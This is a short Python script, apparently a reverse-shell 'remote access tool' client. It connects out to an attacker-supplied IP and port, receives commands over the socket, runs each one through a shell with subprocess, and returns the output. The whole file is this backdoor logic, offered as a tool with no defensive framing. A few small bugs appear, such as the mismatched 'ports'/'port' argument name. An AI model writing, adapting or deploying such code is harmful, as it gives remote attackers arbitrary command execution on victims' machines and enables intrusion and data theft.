import subprocess
import socket
import argparse


def usage():
    print("Examples: v_client.py -a 192.168.0.43 -p 9999 ")
    exit(0)


def execute_command(cmd):
    cmd = cmd.rstrip()

    try:
        results = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        results = "[-] Error: Could not execute command => " + cmd
    return results


def receive_data(client):
    try:
        while True:
            received_cmd = ""
            received_cmd += client.recv(4096)

            if not received_cmd:
                continue
            cmd_results = execute_command(received_cmd)
            client.send(cmd_results)
    except Exception as e:
        print("\n[-] Error:\n" + str(e))
        pass


def client_connect(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((host, port))
        print("[+] Connected with the server ", host, " on port ", str(port))
        receive_data(client)
    except Exception as e:
        print("\n[-] Error:\n" + str(e))
        client.close()


def parse():
    """parse any arguments passed into the cmd line"""

    parser = argparse.ArgumentParser(prog='v_client.py',
                                     description='''Simple remote access tool - client''',
                                     epilog='''Created by K''',
                                     usage='%(prog)s [-a] address [-p] port'
                                     )
    parser.add_argument("-a", "--address", type=str, help="Server IP address")
    parser.add_argument("-p", "--ports", type=int, default="9999", help="Port to connect with")

    args = parser.parse_args()
    if args.address == None:
        usage()
    target_host = args.address
    port_number = args.port

    return target_host, port_number


def main():
    target_host, port_number = parse()
    client_connect(target_host, port_number)


if __name__ == '__main__':
    # call the main function
    main()
